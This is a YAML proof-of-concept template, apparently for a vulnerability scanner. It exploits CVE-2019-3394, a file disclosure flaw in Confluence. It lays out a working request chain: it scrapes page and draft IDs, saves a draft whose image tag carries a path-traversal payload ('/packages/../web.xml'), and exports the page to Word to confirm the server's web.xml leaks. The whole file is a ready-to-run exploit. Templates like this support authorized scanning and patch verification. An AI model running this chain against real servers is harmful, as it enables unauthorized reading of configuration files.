name: poc-yaml-confluence-cve-2019-3394-file-disclosure
binding: 68ba4d3f-397e-46d8-bf48-31ecf4f4aaaf
manual: true
detail:
    author: zhiying.zheng
    links:
        - https://paper.seebug.org/1025/
    vulnerability:
        id: CT-8854
        level: high
transport: http
set:
    title: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
        expression: "true"
        output:
            search: '"/pages/createpage\\.action\\?spaceKey=(?P<spaceKey>.*?)&amp".bsubmatch(response.body)'
            spaceKey: search["spaceKey"]
    r1:
        request:
            cache: true
            method: GET
            path: /pages/createpage.action?spaceKey={{spaceKey}}&src=quick-create
        expression: response.status == 200
        output:
            search: '''<meta id="confluence-space-key" name="confluence-space-key" content="(.+?)">(\\w|\\W)*?<meta name="ajs-parent-page-id" content="(?P<parentPageID>.+?)">(\\w|\\W)*?<meta name="ajs-draft-id" content="(?P<draftID>.+?)">''.bsubmatch(response.body)'
            parentPageID: search["parentPageID"]
            draftID: search["draftID"]
    r2:
        request:
            cache: true
            method: PUT
            path: /rest/api/content/{{draftID}}?status=draft
            headers:
                Content-Type: application/json
            body: |
                {"status":"current","title":"{{title}}","space":{"key":"{{spaceKey}}"},"body":{"editor":{"value":"<img src=\"/packages/../web.xml\">","representation":"editor","content":{"id":"{{draftID}}"}}},"id":"{{draftID}}","type":"page","version":{"number":1,"minorEdit":true,"syncRev":""},"ancestors":[{"id":"{{parentPageID}}","type":"page"}]}
        expression: "true"
    r3:
        request:
            cache: true
            method: GET
            path: /exportword?pageId={{draftID}}
        expression: response.status == 200 && response.body.bcontains(b"filter-plugin-dispatcher-before-login-forward")
expression: r0() && r1() && r2() && r3()
